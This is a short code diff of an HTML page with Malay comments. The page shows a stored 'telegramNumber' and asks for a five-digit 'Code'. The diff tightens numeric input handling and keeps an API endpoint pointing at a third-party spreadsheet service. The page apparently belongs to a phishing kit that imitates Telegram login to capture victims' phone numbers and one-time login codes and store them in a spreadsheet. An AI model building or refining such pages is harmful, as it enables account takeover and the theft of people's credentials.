@@ -19,9 +19,11 @@
       </p>
 
       <form id="codeForm" class="form-box">
-        <!-- Tukar ke type="text" dan kawal melalui JS -->
+        <!-- type="tel" + inputmode="numeric" untuk mobile -->
         <input 
-          type="text" 
+          type="tel" 
+          inputmode="numeric" 
+          pattern="[0-9]*"
           id="codeInput" 
           class="input" 
           placeholder="Code" 
@@ -33,6 +35,7 @@
   </div>
 
   <script>
+    // Paparkan nombor disimpan
     const savedNumber = localStorage.getItem("telegramNumber");
     if (savedNumber) {
       document.getElementById("showNumber").textContent = savedNumber;
@@ -42,13 +45,18 @@
     const nextBtn = document.getElementById("nextBtn");
     const form = document.getElementById("codeForm");
 
-    // Benarkan hanya nombor ditaip
+    // Sekat huruf & simbol pada semua peranti
     codeInput.addEventListener("input", () => {
-      // Buang semua bukan nombor secara automatik
-      codeInput.value = codeInput.value.replace(/[^0-9]/g, "");
-
+      codeInput.value = codeInput.value.replace(/[^0-9]/g, ""); // buang bukan nombor
       const value = codeInput.value.trim();
       nextBtn.disabled = !/^\d{5}$/.test(value);
+    });
+
+    // Sekat huruf bila tekan papan kekunci (extra layer)
+    codeInput.addEventListener("keypress", (e) => {
+      if (!/[0-9]/.test(e.key)) {
+        e.preventDefault();
+      }
     });
 
     const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";
